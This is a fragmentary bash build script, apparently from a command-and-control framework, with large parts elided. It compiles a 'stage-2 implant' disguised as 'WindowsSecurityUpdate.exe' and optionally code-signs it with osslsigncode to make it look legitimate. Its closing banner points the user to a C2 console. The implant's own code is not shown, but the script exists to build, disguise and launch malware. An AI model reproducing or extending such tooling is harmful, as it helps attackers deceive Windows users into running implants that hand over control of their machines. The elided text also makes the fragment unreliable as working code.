...
#
#  Outputs
#    build/WindowsSecurityUpdate.exe   — stage-2 implant (only)
#
#  Usage
...
# ─────────────────────────────────────────────────────────────────────────────
#  Build: WindowsSecurityUpdate.exe (implant – launcher removed)
# ─────────────────────────────────────────────────────────────────────────────
echo ""
...
# ─────────────────────────────────────────────────────────────────────────────
#  Optional: code signing (implant only)
# ─────────────────────────────────────────────────────────────────────────────
if [[ $SIGN -eq 1 ]]; then
    if ! command -v osslsigncode &>/dev/null; then
        ...
        SRC="$OUT_DIR/$IMPLANT_OUT"
        TMP="$OUT_DIR/${IMPLANT_OUT%.exe}_signed.exe"
        echo "[*] Signing $IMPLANT_OUT …"
        ...
        then
            mv "$TMP" "$SRC"
            echo "[+] Signed: $IMPLANT_OUT"
        else
            rm -f "$TMP"
            echo "[-] Signing failed (cert may not be trusted)"
        fi
    fi
fi
...
echo "║  3. Use CLI: python server/c2_cli.py console                    ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""